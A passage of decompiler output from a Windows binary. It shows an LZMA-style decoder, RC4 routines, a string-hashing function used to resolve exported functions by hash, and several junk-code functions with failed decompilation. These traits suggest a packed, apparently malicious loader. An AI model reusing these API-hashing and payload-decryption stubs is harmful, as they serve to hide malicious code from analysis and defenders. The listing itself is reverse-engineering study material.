            v10 = *v21 * (v20 >> 11);
            v11 = v8 + ((2048 - v8) >> 5);
            v12 = v92;
            *v21 = v11;
          }
          v92 = v91;
        }
        else
        {
          v10 = *v46 * (v57 >> 11);
          v37 = v54 + ((2048 - v54) >> 5);
          v12 = v91;
          *v46 = v37;
        }
        v91 = v93;
        v93 = v12;
        goto LABEL_96;
      }
      *v31 = v6 + ((2048 - v6) >> 5);
      v52 = v7;
      v53 = &a3[16 * v95 + 240 + v33];
      if ( v7 < 0x1000000 )
      {
        v52 = v7 << 8;
        v75 = *a2++ | (v98 << 8);
        v98 = v75;
      }
      v15 = *v53;
      v16 = *v53 * (v52 >> 11);
      if ( v98 >= v16 )
      {
        v98 -= v16;
        v10 = v52 - v16;
        *v53 = v15 - (v15 >> 5);
LABEL_96:
        v95 = v95 >= 7 ? 11 : 8;
        v42 = a3 + 1332;
        goto LABEL_57;
      }
      v17 = v94;
      v39 = *v53 * (v52 >> 11);
      *v53 = v15 + ((2048 - v15) >> 5);
      v95 = 2 * (v95 >= 7) + 9;
      v35 = v94 - v93;
      ++v94;
      v97 = *(_BYTE *)(v35 + a1);
      *(_BYTE *)(v17 + a1) = v97;
    }
    v10 = *v65 * (v19 >> 11);
    v86 = v92;
    v92 = v91;
    *v65 = v79 + ((2048 - v79) >> 5);
    v91 = v93;
    v95 = v95 >= 7 ? 3 : 0;
    v42 = a3 + 818;
LABEL_57:
    if ( v10 < 0x1000000 )
    {
      v48 = *a2 | (v98 << 8);
      v10 <<= 8;
      ++a2;
      v98 = v48;
    }
    v23 = *v42;
    v24 = *v42 * (v10 >> 11);
    if ( v98 >= v24 )
    {
      v98 -= v24;
      v67 = v10 - v24;
      *v42 = v23 - (v23 >> 5);
      if ( v67 < 0x1000000 )
      {
        v66 = *a2 | (v98 << 8);
        v67 <<= 8;
        ++a2;
        v98 = v66;
      }
      v34 = v42[1];
      v32 = v34 * (v67 >> 11);
      if ( v98 >= v32 )
      {
        v98 -= v32;
        v39 = v67 - v32;
        v42[1] = v34 - (v34 >> 5);
        v69 = (int)(v42 + 258);
        v87 = 16;
        v90 = 8;
        goto LABEL_5;
      }
      v39 = v34 * (v67 >> 11);
      v42[1] = v34 + ((2048 - v34) >> 5);
      v69 = (int)&v42[8 * v33 + 130];
      v87 = 8;
    }
    else
    {
      v39 = *v42 * (v10 >> 11);
      v87 = 0;
      *v42 = v23 + ((2048 - v23) >> 5);
      v69 = (int)&v42[8 * v33 + 2];
    }
    v90 = 3;
LABEL_5:
    v83 = v90;
    v5 = 1;
    do
    {
      if ( v39 < 0x1000000 )
      {
        v81 = *a2 | (v98 << 8);
        v39 <<= 8;
        ++a2;
        v98 = v81;
      }
      v50 = *(_DWORD *)(v69 + 4 * v5);
      v51 = v50 * (v39 >> 11);
      if ( v98 >= v51 )
      {
        v98 -= v51;
        v39 -= v51;
        *(_DWORD *)(v69 + 4 * v5) = v50 - (v50 >> 5);
        v5 = 2 * v5 + 1;
      }
      else
      {
        v39 = v50 * (v39 >> 11);
        *(_DWORD *)(v69 + 4 * v5) = v50 + ((2048 - v50) >> 5);
        v5 *= 2;
      }
      --v83;
    }
    while ( v83 );
    v59 = 1;
    v43 = v87 - (1 << v90) + v5;
    if ( v95 >= 4 )
    {
      v68 = v93;
      goto LABEL_37;
    }
    v95 += 7;
    v38 = v43 >= 4 ? 3 : v43;
    v18 = &a3[64 * v38 + 432];
    v84 = 6;
    do
    {
      if ( v39 < 0x1000000 )
      {
        v41 = *a2 | (v98 << 8);
        v39 <<= 8;
        ++a2;
        v98 = v41;
      }
      v58 = v18[v59];
      v3 = v58 * (v39 >> 11);
      if ( v98 >= v3 )
      {
        v98 -= v3;
        v39 -= v3;
        v18[v59] = v58 - (v58 >> 5);
        v59 = 2 * v59 + 1;
      }
      else
      {
        v39 = v58 * (v39 >> 11);
        v18[v59] = v58 + ((2048 - v58) >> 5);
        v59 *= 2;
      }
      --v84;
    }
    while ( v84 );
    v30 = v59 - 64;
    if ( v30 >= 4 )
    {
      v63 = v30 & 1 | 2;
      if ( v30 >= 14 )
      {
        v25 = (v30 >> 1) - 5;
        do
        {
          if ( v39 < 0x1000000 )
          {
            v27 = *a2 | (v98 << 8);
            v39 <<= 8;
            ++a2;
            v98 = v27;
          }
          v39 >>= 1;
          v63 *= 2;
          if ( v98 >= v39 )
          {
            v98 -= v39;
            v63 |= 1u;
          }
          --v25;
        }
        while ( v25 );
      }
      JUMPOUT(0x4067F6);
    }
    v68 = v30 + 1;
    v93 = v30 + 1;
    if ( v30 == -1 )
      return v94;
LABEL_37:
    v28 = v43 + 2;
    v29 = (unsigned __int8 *)(a1 + v94 - v68);
    do
    {
      v44 = *v29;
      v45 = v94;
      --v28;
      ++v94;
      ++v29;
      v97 = v44;
      *(_BYTE *)(v45 + a1) = v44;
    }
    while ( v28 );
  }
}
// 404FF9: control flows out of bounds to 4067F6

//----- (00404D91) --------------------------------------------------------
int __cdecl sub_404D91(int a1, int a2, _BYTE *a3)
{
  unsigned __int8 v3; // al
  int v4; // eax
  unsigned int v5; // esi
  _BYTE *v6; // eax
  char v7; // bl
  unsigned int i; // esi
  int result; // eax
  int v10; // et2
  char v11; // cl
  _BYTE *v12; // [esp+Ch] [ebp-8h]
  unsigned __int8 v13; // [esp+13h] [ebp-1h]

  v5 = 0;
  v6 = a3;
  do
  {
    v11 = v5++;
    *v6++ = v11;
  }
  while ( v5 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v13 = 0;
  v7 = 0;
  v12 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v3 = v7 + *v12 + *(_BYTE *)(a1 + v13);
    v7 += *v12 + *(_BYTE *)(a1 + v13);
    sub_403F42(&a3[i], &a3[v3]);
    v4 = v13 + 1;
    v10 = v4 % a2;
    result = v4 / a2;
    v13 = v10;
    ++v12;
  }
  return result;
}

//----- (00405341) --------------------------------------------------------
void __usercall sub_405341(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  qmemcpy(a2, a3, a1);
  LOBYTE(dword_444915) = dword_444915 + 72;
}
// 444915: using guessed type int dword_444915;

//----- (004056AA) --------------------------------------------------------
int __usercall sub_4056AA@<eax>(int a1@<esi>)
{
  int v2; // ebx
  unsigned int v3; // esi
  unsigned int v4; // eax

  v3 = (unsigned int)(a1 - 1 - dword_444DAD) >> 3;
  v4 = dword_443160 ^ (dword_443160 << 11);
  dword_4448D9 += v3;
  dword_443160 = dword_443190;
  v2 = dword_443190;
  dword_443190 = dword_4431AC;
  dword_444905 -= (__CFADD__((v3 ^ 0x192A) < MEMORY[0x44641D], (v3 ^ 0x192A) - MEMORY[0x44641D]) | __CFADD__(
                                                                                                     ((v3 ^ 0x192A) < MEMORY[0x44641D]) + (v3 ^ 0x192A) - MEMORY[0x44641D],
                                                                                                     26170))
                + v2
                + 20059;
  dword_4431AC = dword_443148;
  dword_444915 -= 17780;
  dword_443148 ^= (v4 >> 8) ^ v4 ^ ((unsigned int)dword_443148 >> 19);
  dword_4431DC = dword_443148;
  dword_4448F5 -= dword_444BD9;
  return dword_443148;
}
// 443148: using guessed type int dword_443148;
// 443160: using guessed type int dword_443160;
// 443190: using guessed type int dword_443190;
// 4431AC: using guessed type int dword_4431AC;
// 4431DC: using guessed type int dword_4431DC;
// 4448D9: using guessed type int dword_4448D9;
// 4448F5: using guessed type int dword_4448F5;
// 444905: using guessed type int dword_444905;
// 444915: using guessed type int dword_444915;
// 444BD9: using guessed type int dword_444BD9;
// 444DAD: using guessed type int dword_444DAD;

//----- (00405F73) --------------------------------------------------------
unsigned int __cdecl sub_405F73(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00406C59) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_406C59@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<ebp>, _DWORD *a4@<edi>)
{
  unsigned int i; // esi

  *(_DWORD *)(a3 - 8) = a2 + a1;
  *(_DWORD *)(a3 - 12) = a2 + a4[9];
  for ( i = 0; a4[6] > i; ++i )
  {
    if ( (sub_405F73((_BYTE *)(a2 + **(_DWORD **)(a3 - 8))) ^ 0x833E0473) == *(_DWORD *)(a3 + 8) )
    {
      *(_DWORD *)(a3 - 4) = **(unsigned __int16 **)(a3 - 12);
      break;
    }
    *(_DWORD *)(a3 - 8) += 4;
    *(_DWORD *)(a3 - 12) += 2;
  }
  if ( a4[6] == i )
    return 0;
  else
    return a2 + *(_DWORD *)(a2 + a4[7] + 4 * *(_DWORD *)(a3 - 4));
}
// 404E6C: positive sp value 10 has been found
// 406C59: could not find valid save-restore pair for esi

//----- (00406FE5) --------------------------------------------------------
unsigned __int8 __cdecl sub_406FE5(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 result; // al
  int v5; // edx
  _BYTE *i; // [esp-Ch] [ebp-10h]
  unsigned int v7; // [esp-8h] [ebp-Ch]
  unsigned __int8 v8; // [esp-1h] [ebp-5h]

  v3 = *(_BYTE *)(a3 + 256);
  v8 = *(_BYTE *)(a3 + 257);
  v7 = 0;
  for ( i = a1; v7 < a2; ++i )
  {
    v5 = (v3 + 1) % 256;
    v3 = (v3 + 1) % 256;
    v8 += *(_BYTE *)(a3 + (unsigned __int8)v5);
    sub_403F42((_BYTE *)(a3 + (unsigned __int8)v5), (_BYTE *)(a3 + v8));
    *i ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v8) + *(_BYTE *)(a3 + v3)));
    ++v7;
  }
  *(_BYTE *)(a3 + 256) = v3;
  result = v8;
  *(_BYTE *)(a3 + 257) = v8;
  return result;
}

//----- (004099F1) --------------------------------------------------------
void __usercall sub_4099F1(
        bool a1@<cf>,
        int _EAX@<eax>,
        unsigned __int8 a3@<dl>,
        int a4@<ecx>,
        int a5@<ebx>,
        int a6@<edi>,
        double a7@<st0>)
{
  char v7; // tt
  bool v9; // cf
  bool v10; // of
  char v11; // tt

  v11 = a1 + 22;
  v9 = (unsigned __int8)_EAX < (unsigned __int8)(a1 + 22);
  v10 = __OFSUB__((_BYTE)_EAX, v11);
  LOBYTE(_EAX) = _EAX - v11;
  if ( !v10 )
  {
    _disable();
    JUMPOUT(0x5E69E03F);
  }
  while ( 1 )
  {
    v7 = v9 + BYTE1(a4);
    v9 = (unsigned __int8)a5 < (unsigned __int8)(v9 + BYTE1(a4));
    LOBYTE(a5) = a5 - v7;
    --a4;
    if ( !(_BYTE)a5 || !a4 )
      break;
    a5 = 182357353;
  }
  a1 = a3 < *(_BYTE *)(a5 + 2 * a6 - 1871164569);
  LOBYTE(a4) = -94;
  __asm { icebp }
  *(float *)(a4 + 2) = a7;
  __asm { aas }
  *(_BYTE *)(_EAX - 87) -= a1 + BYTE1(a4);
  JUMPOUT(0x4099BE);
}
// 4099BB: control flows out of bounds to 4099BE
// 409A02: control flows out of bounds to 5E69E03F

//----- (0040ADA8) --------------------------------------------------------
int __usercall sub_40ADA8@<eax>(int a1@<ebp>, int a2@<edi>)
{
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  *(_DWORD *)(a2 + 100) ^= a1;
  return MK_FP(retaddr[0], retaddr[0])();
}

//----- (0040C30D) --------------------------------------------------------
void __fastcall __noreturn sub_40C30D(char a1, int a2)
{
  *(_DWORD *)(a2 - 1367997311) <<= a1;
  JUMPOUT(0x28B1DC);
}
// 40C321: control flows out of bounds to 28B1DC

// nfuncs=33 queued=32 decompiled=32 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 32 function(s)"
